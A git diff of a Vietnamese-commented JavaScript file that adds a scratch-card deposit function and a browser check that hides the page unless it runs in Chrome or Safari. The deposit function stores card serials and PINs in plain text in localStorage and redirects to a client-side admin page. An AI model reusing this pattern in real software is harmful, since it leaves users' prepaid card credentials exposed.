@@ -274,3 +274,39 @@ function contactUs(platform) {
         alert("Vui lòng nhập đầy đủ thông tin!");
     }
 }
+
+// Hàm gửi thông tin thẻ cào và chuyển đến trang quản lý
+function submitCard() {
+    const seri = document.getElementById('seri').value.trim();
+    const pin = document.getElementById('pin').value.trim();
+
+    // Kiểm tra nếu người dùng chưa nhập đủ thông tin
+    if (!seri || !pin) {
+        alert('Vui lòng nhập đầy đủ thông tin thẻ cào!');
+        return;
+    }
+
+    // Lưu thông tin thẻ cào vào localStorage (hoặc bạn có thể gửi đến server)
+    const depositInfo = { seri, pin, date: new Date().toISOString() };
+    let deposits = JSON.parse(localStorage.getItem('deposits')) || [];
+    deposits.push(depositInfo);
+    localStorage.setItem('deposits', JSON.stringify(deposits));
+
+    // Chuyển đến trang quản lý tin nhắn (dành cho ADMIN)
+    window.location.href = 'admin-dashboard.html';
+}
+
+// Hàm kiểm tra trình duyệt
+        function checkBrowser() {
+            var userAgent = navigator.userAgent;
+            // Kiểm tra trình duyệt
+            if (!userAgent.includes("Chrome") && !userAgent.includes("Safari")) {
+                // Nếu không phải Chrome hoặc Safari, hiển thị thông báo khóa web
+                alert("Vui lòng sử dụng trình duyệt Chrome hoặc Safari để truy cập trang web.");
+                // Tạm thời ẩn nội dung trang web
+                document.body.style.display = "none";
+            }
+        }
+
+        // Kiểm tra trình duyệt khi trang web được tải
+        window.onload = checkBrowser;
